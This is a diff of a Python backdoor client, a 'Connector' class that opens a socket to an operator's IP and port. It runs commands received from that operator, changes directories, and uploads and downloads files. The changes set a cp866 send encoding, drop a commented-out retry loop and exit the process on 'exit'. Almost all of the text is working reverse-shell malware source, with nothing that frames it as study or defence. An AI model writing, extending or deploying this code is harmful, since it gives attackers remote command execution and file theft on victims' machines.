@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-import socket, subprocess, json, os, base64, time
+import socket, subprocess, json, os, base64, sys
 
 class Connector:
     def __init__(self, ip, port):
@@ -10,7 +10,7 @@ class Connector:
     def reliable_send(self, data):
         while True:
             try:
-                self.connection.send(json.dumps(data))
+                self.connection.send(json.dumps(data, encoding="cp866"))
                 return
             except UnicodeDecodeError:
                 data = "[-] 'utf-8' codec can't decode... Client side encoding is different than 'utf-8' and does not set.\r\n"
@@ -43,25 +43,20 @@ class Connector:
             return "[+] Upload successful.\r\n"
 
     def run(self):
-        # while True:
-        #     try:
-                while True:
-                    command = self.reliable_receive()
-                    try:
-                        if command[0] == "exit":
-                            self.connection.close()
-                            return
-                        elif command[0] == "cd" and len(command) > 1:
-                            command_result = self.change_working_directory_to(command[1])
-                        elif command[0] == "download":
-                            command_result = self.read_file(command[1])
-                        elif command[0] == "upload":
-                            command_result = self.write_file(command[1], command[2])
-                        else:
-                            command_result = self.execute_system_command(command)
-                    except Exception:
-                        command_result = "[-] Exception during command execution.\r\n"
-                    self.reliable_send(command_result)
-            # except:
-            #     time.sleep(300)
-            #     continue
+        while True:
+            command = self.reliable_receive()
+            try:
+                if command[0] == "exit":
+                    self.connection.close()
+                    sys.exit()
+                elif command[0] == "cd" and len(command) > 1:
+                    command_result = self.change_working_directory_to(command[1])
+                elif command[0] == "download":
+                    command_result = self.read_file(command[1])
+                elif command[0] == "upload":
+                    command_result = self.write_file(command[1], command[2])
+                else:
+                    command_result = self.execute_system_command(command)
+            except Exception:
+                command_result = "[-] Exception during command execution.\r\n"
+            self.reliable_send(command_result)
